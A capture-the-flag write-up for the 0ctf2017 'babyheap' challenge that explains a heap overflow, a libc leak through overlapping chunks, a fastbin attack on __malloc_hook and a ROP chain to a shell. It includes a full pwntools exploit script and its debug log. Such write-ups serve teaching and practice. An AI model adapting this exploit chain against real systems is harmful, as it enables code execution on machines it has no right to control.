---
layout: page
title: "0ctf2017-babyheap"
nav_order: 2
permalink: /ctf/0ctf2017/babyheap
---
# Background
There are two x64 elfs in this challenge:
1. 0ctfbabyheap!
2. libc-2.23.so 

[[Resources.rar]]

This is a pretty old heap challenge from 0ctf2017, it has a classic allocator-like mechanism.
![[Pasted image 20230420004312.png]]

# Binary analysis
## Checksec 
![[Pasted image 20230420004516.png]]

## General background and quirks
In this challenge, the challenge is initialized with mapping an anonymous page at a random address, this page is used for book-keeping the allocated chunks:
![[Pasted image 20230420004910.png]]

## Vulnerability
When using the fill option (2),  the size which is written to the chunk, is not checked against the allocated size, but instead is user-controlled, allowing OOB arbitary write.
![[Pasted image 20230420190805.png]]

# Exploit
Our arbitary OOB can be used for different things, one idea is using fast-bin attack to gain an arbitary chunk (with some limitations).
However, we don't have any information regarding the address we want to write - we need a leak.

## libc leak
Luckily, the program has a Dump (4) option, which allows us to read the chunk content (the size we are allowed to write is the same as we allocated).
We will use this when we will create overlapping chunks (using the OOB), and free the smaller chunk, then dumping the other one (which contains the free'd chunk), this will display the content of the free chunk, which will leak a libc address.
	*Note:* a freed unsorted-bin chunk, have 2 pointers: `fd` and `bk` (since its a double liked list), 
	if it's the only free chunk in that bin, the `fd` and `bk` pointers will point to a offset in structure in libc (in the data section) - the `main_arena` struct.

### Creating overlapping chunks
Using OOB, we can create overlapping chunks in the following manner:
1. Allocate 3 chunks: #1, #2 and #3 (can be of the same size).
2. Free chunk #1.
3. use OOB on chunk #2 for two purposes:
	a. To Increase the `chunk->prev_size` to include both #2 and #1
	b. To overwrite the `PREV_INSUE` of chunk #3 to 0, faking that #2 is actually free.
4. Free chunk #3.
5. Allocate a chunk of size #1 + #2 + #3
When we free chunk #3, it will check whether the previous chunk is free as well to consolidate with it (by checking the `PREV_INUSE` bit), and will verify that the chunk the is presence at `&chunk_3 - chunk_3->prev_size` is actually a free chunk by unlinking from the free-list it's in.
Since we free'd chunk #1, it's a valid free-chunk, and they will consildate.
Now, The free-list contains a large chunk with the size of #1 + #2 + #3, which we allocate at step 5.
however, we still have a handle  to chunk #2 which resides at the middle of #3 - overlapping chunks!

Now that we have a libc leak, we can use fastbin attack.
## Fastbin attack primer
When we free chunks of certain size (architecture dependent), in x64 its 0x20-0x80 bytes.
it goes into a special bin: the fastbin, the fastbin is a one way linked list (using only the `fd` pointer).
If we corrupt the `fd` pointer of a fastbin free chunk, if we allocate a chunk, we get the corrupted chunk, and the next chunk to be allocated is a the corrupted pointer we wrote, ideally gaining a chunk which resides at an arbitary user-controller address (similar to tcache poisoning).

### Mitigation
In fastbin chunks, when we take a chunk out of the free-list, it checks if the size of the chunk fits the bin size, so we can't actually corrupt the `fd` pointer to an arbitary address, but to an address that in the `size` offset has the size matching the size of the bin it's getting taken out of.
![[Pasted image 20230420215344.png]]

## Using Fastbin attack to overwrite `malloc_hook`
Transforming arbitary write to code execution can be done via overwriting function pointers,
A good candidate is `malloc_hook` which is a hooking function for `libc_malloc`, there are also other hooking candidates such as `free_hook`, `__realloc_hook` and more.
But how to overcome the [[#Mitigations]]?
Looking around `malloc_hook` address we can see the following:
![[Pasted image 20230420212008.png]]
And we can see that at `_IO_wide_data_0+304` resides some address in libc, with the MSByte of 0x7f.
If we do some memory alignment tricks, remembering little endian properties, if we look at the qword at address `_IO_wide_data_0+304+5`:
![[Pasted image 20230420212354.png]]
If we make sure this is at the `size` offset of a fake fastbin free chunk, we can get an allocation to `_IO_wide_data_0+304+5+0x8` and we can overwrite `__malloc_hook`.
	0x7f is equivilant to 0x70 due to the way the `chunksize` macro works:	![[Pasted image 20230420215642.png]]
	As we can see the size is masked with `~SIZE_BITS`, which effectivly zeros out 4 lsb.

So the idea is to:
1. Allocate a target chunk - chunk #4.
2. Allocate a chunk of size 0x70 (such that the fake chunk size will be considered in the freebin size) - chunk #5
3. Free chunk #5 into the fastbin freelist.
4. Corrupt the freelist using OOB on chunk #4, such that the pointer to the next free fastbin chunk will point to `_IO_wide_data_0+304+5-8`, `_IO_wide_data_0` can be calculated via the [[#libc leak]].
5. Allocate twice a chunk of size 0x70, the first allocation will get chunk #5 back, the second allocation will get us a chunk located at `_IO_wide_data_0+304+5-8`!

## Using `__malloc_hook` to get a chunk on the stack
Now we can overwrite up to 0x68 bytes using the Fill (2) option, which can easly cover `__malloc_hook`.
Now that we can write to the function pointer, we need a single snippet of code we wish to run.
Usually this is where one_gadget is used, however this time, it's not so easy, let's take a look:
![[Pasted image 20230420220942.png]]
We have some constrains, sadly, none of those constrains is satisfied as is, meaning, we have to handle the constrains before jumping to the one_gadget address,

looking at the context `__malloc_hook` is being called to, we have a look during runtime:
![[Pasted image 20230420222352.png]]
We make an important observation: `RCX` points to the somewhere on the stack:
![[Pasted image 20230420222626.png]]
So, if we can get a chunk pointing to `RCX`, we can write into the stack.
Since `__libc_malloc` returns the return value of `__malloc_hook`, if we make the return value of `__malloc_hook` point to `RCX`, we get a chunk pointing to the stack.
This can be done by making `__malloc_hook` point to the following gadget (found using ropper):
![[Pasted image 20230420224319.png]]
And the next allocation will yield a chunk on the stack.

## Running ROP using the stack chunk
In order to know at what offset to write the rop, we turn again to dynamic debugging, we set a breakpoint to the `read` function which reads into the chunk from stdin, and look at the context:
![[Pasted image 20230420225203.png]]
The address which we write into is in `RSI`, and as we can see, the current function frame is at `0x7ffdd4dca2b0` (as pointed by rbp), hence we need to overwrite 3 qwords until the return address.
and then we can write our rop payload, and once the read function will return, the rop will be executed.

### Rop payload
We did all of this just so that we can run a rop instead of a single one_gadget address using `__malloc_hook`, this is because, we will use 2 gadgets in our rop, the first one is:
![[Pasted image 20230420225510.png]]
Which will be used to satisfy the first one_gadget - gadget constraint.
And the second gadget will be the one_gadget address.
The rop will look like this on the stack:
![[Pasted image 20230420225755.png]]

# Running the exploit
Putting it all together, we pop a shell:
``` Python LOG
  io.recvuntil("Command:")
[DEBUG] Received 0x53 bytes:
    b'===== Baby Heap in 2017 =====\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:31: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("1")
[DEBUG] Sent 0x2 bytes:
    b'1\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:32: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(size))
[DEBUG] Sent 0x3 bytes:
    b'40\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Command:")
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 0\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'152\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 1\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'152\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 2\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'152\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 3\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 4\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'104\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 5\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 6\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("2")
[DEBUG] Sent 0x2 bytes:
    b'2\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(index))
[DEBUG] Sent 0x2 bytes:
    b'0\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(size))
[DEBUG] Sent 0x3 bytes:
    b'48\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Command:", timeout=1)
[DEBUG] Received 0x4b bytes:
    b'Index: Size: Content: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("3")
[DEBUG] Sent 0x2 bytes:
    b'3\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(index))
[DEBUG] Sent 0x2 bytes:
    b'1\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Command:")
[DEBUG] Received 0x3c bytes:
    b'Index: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x3c bytes:
    b'Index: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'472\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 1\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'160\n'
[DEBUG] Received 0x4b bytes:
    b'Index: Size: Content: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x3c bytes:
    b'Index: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("4")
[DEBUG] Sent 0x2 bytes:
    b'4\n'
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(index))
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x21f bytes:
    00000000  49 6e 64 65  78 3a 20 43  6f 6e 74 65  6e 74 3a 20  │Inde│x: C│onte│nt: │
    00000010  0a 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000a0  00 00 00 00  00 00 00 00  00 41 01 00  00 00 00 00  │····│····│·A··│····│
    000000b0  00 78 4b 1c  37 b4 7f 00  00 78 4b 1c  37 b4 7f 00  │·xK·│7···│·xK·│7···│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000001e0  00 40 01 00  00 00 00 00  00 0a 31 2e  20 41 6c 6c  │·@··│····│··1.│ All│
    000001f0  6f 63 61 74  65 0a 32 2e  20 46 69 6c  6c 0a 33 2e  │ocat│e·2.│ Fil│l·3.│
    00000200  20 46 72 65  65 0a 34 2e  20 44 75 6d  70 0a 35 2e  │ Fre│e·4.│ Dum│p·5.│
    00000210  20 45 78 69  74 0a 43 6f  6d 6d 61 6e  64 3a 20     │ Exi│t·Co│mman│d: │
    0000021f
/home/user/PycharmProjects/0ctf2017_babyheap/./main.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Command:")
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x3c bytes:
    b'Index: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Sent 0x3 bytes:
    b'40\n'
[DEBUG] Received 0x4b bytes:
    b'Index: Size: Content: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'104\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 2\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x4 bytes:
    b'104\n'
[DEBUG] Received 0x2b bytes:
    b'Size: Allocate Index 3\n'
    b'1. Allocate\n'
    b'2. Fill\n'
[DEBUG] Received 0x21 bytes:
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x3 bytes:
    b'27\n'
[DEBUG] Received 0x4b bytes:
    b'Index: Size: Content: 1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Sent 0x2 bytes:
    b'8\n'
[DEBUG] Received 0x4c bytes:
    b'Size: Allocate Index 5\n'
    b'1. Allocate\n'
    b'2. Fill\n'
    b'3. Free\n'
    b'4. Dump\n'
    b'5. Exit\n'
    b'Command: '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Sent 0x3 bytes:
    b'40\n'
[DEBUG] Received 0x16 bytes:
    b'Index: Size: Content: '
[*] Switching to interactive mode
 Index: Size: Content: $ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x84 bytes:
    b'uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)\n'
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

```

## Final exploit code
```Python
import pwn

PREV_INUSE = 0x1
CHUNK_ALIGNMENT = ~(0x10 - 1)


def fill(io, index, size, content: bytes):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(size))
    io.send_raw(content)
    io.recvuntil("Command:", timeout=1)


def free(io, index):
    io.sendline("3")
    io.sendline(str(index))
    io.recvuntil("Command:")


def dump(io, index) -> bytearray:
    io.sendline("4")
    io.sendline(str(index))
    content_bytes = io.recvuntil(b"1.")
    content_bytearray = bytearray(content_bytes)[:-2]
    io.recvuntil("Command:")
    return content_bytearray


def allocate(io, size):
    io.sendline("1")
    io.sendline(str(size))
    io.recvuntil("Command:")


def exit(io):
    io.sendline("5")


def main():
    pwn.context.log_level = 'DEBUG'
    libc = pwn.ELF("libc.so.6")

    io = pwn.process(argv=["./ld-linux-x86-64.so.2", "./0ctfbabyheap_patched", "--preload", "./libc.so.6"])
    io.recvuntil("Command:")

    allocate(io, 0x28)  # 0
    allocate(io, 0x98)  # 1
    allocate(io, 0x98)  # 2
    allocate(io, 0x98)  # 3
    allocate(io, 0x18)  # 4
    allocate(io, 0x68)  # 5 - will be used to fastbin attack - goes into 0x70 fastbin chunks.
    allocate(io, 0x18)  # 6

    fill(io, 0, 0x30, bytes(0x28) + pwn.p64(((0xa0 + 0xa0) & CHUNK_ALIGNMENT) | PREV_INUSE))
    free(io, 1)
    free(io, 3)  # Will consolidate with 1.
    allocate(io, 0xa0 + 0xa0 + 0xa0 - 0x8)  # 1

    # Now, since we got 1 through calloc, we need to fake a chunk at offset 0x98 before freeing #2
    fill(io, 1, 0xa0, bytes(0x98) + pwn.p64(
        (0x98 + 0x8 + 0x98 + 0x8) & CHUNK_ALIGNMENT | PREV_INUSE))  # must point to chunk 4, since 1 and 3 consolidated.

    # after free, 1 and 2 overlap.
    free(io, 2)
    free_unsortedbin_content_bytearray = dump(io, 1)
    text_offset = 0x12
    libc_leak_bytes = free_unsortedbin_content_bytearray[0xa0 + text_offset:0xa8 + text_offset]
    libc_leak = pwn.u64(libc_leak_bytes)
    # libc_base = libc_leak - 3939160
    libc_base = libc_leak - 3951480  # new libc
    chunk_fd_offset = 0x8
    fastbin_chunk_addr = libc.symbols["_IO_wide_data_0"] + libc_base + 304 + 5 - chunk_fd_offset
    free(io, 5)  # goes into fastbin 0x70
    fill(io, 4, 0x18 + 0x8 + 0x8,
         bytes(0x18) + pwn.p64(((0x70) & CHUNK_ALIGNMENT) | PREV_INUSE) + pwn.p64(fastbin_chunk_addr))
    allocate(io, 0x68)  # 2
    allocate(io, 0x68)  # 3 - this chunk will be located at fastbin_chunk_addr
    get_stack_ptr_gadget_rva = 0x0000000000033ea6  # mov rax, rcx; ret;
    get_stack_ptr_gadget = libc_base + get_stack_ptr_gadget_rva
    jump_table_payload = bytes(3) + pwn.p64(get_stack_ptr_gadget) * 3
    fill(io, 3, len(jump_table_payload), jump_table_payload)

    allocate(io, 0x8)  # 5

    one_gadget_rva = 0x45216  # new libc
    # Now chunk 5 points to the stack.
    one_gadget_address = libc_base + one_gadget_rva
    zero_rax_gadget_rva = 0x000000000008b8c5
    zero_rax_gadget = libc_base + zero_rax_gadget_rva
    rop_payload = bytes(8 * 3) + pwn.p64(zero_rax_gadget) + pwn.p64(one_gadget_address)
    fill(io, 5, len(rop_payload), rop_payload)
    
    io.interactive()


main()

```
